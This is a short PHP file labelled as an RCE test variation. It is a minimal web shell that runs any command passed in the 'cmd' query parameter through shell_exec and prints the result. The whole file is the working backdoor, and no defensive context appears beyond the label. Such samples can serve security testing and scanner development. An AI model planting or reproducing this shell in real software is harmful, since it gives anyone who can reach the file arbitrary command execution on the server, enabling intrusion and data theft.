<?php
// RCE test variation #977
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>